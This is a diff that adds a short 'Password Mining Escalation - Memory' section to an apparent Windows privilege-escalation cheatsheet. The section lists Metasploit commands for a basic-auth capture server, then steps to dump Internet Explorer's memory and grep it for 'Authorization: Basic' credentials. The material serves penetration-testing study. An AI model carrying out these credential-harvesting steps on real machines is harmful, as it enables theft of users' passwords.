@@ -781,6 +781,27 @@ BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
 
 -------------------------
 
+### Password Mining Escalation - Memory
+
+- Open command prompt and type: msfconsole
+- In Metasploit (msf > prompt) type: use auxiliary/server/capture/http_basic
+- In Metasploit (msf > prompt) type: set uripath x
+- In Metasploit (msf > prompt) type: run
+
+![image](https://github.com/user-attachments/assets/e5a34e1c-9a09-4b5a-bdf9-8526c3df4d33)
+
+- Load the basic http site on internet explorer `iexplore.exe`
+
+![image](https://github.com/user-attachments/assets/3e29ed28-18ac-421b-8c52-ca2b035095a9)
+
+- Go to taskmgr `taskmgr.exe` and create a dump
+
+![image](https://github.com/user-attachments/assets/3a4e8821-5d2e-4fc8-9ed3-a45bbd234403)
+
+- Copy the dump and grep for `Authorization: Basic`
+
+
+
 ### AD Cheatsheet
 
 [HTB](https://www.hackthebox.com/blog/active-directory-penetration-testing-cheatsheet-and-guide)
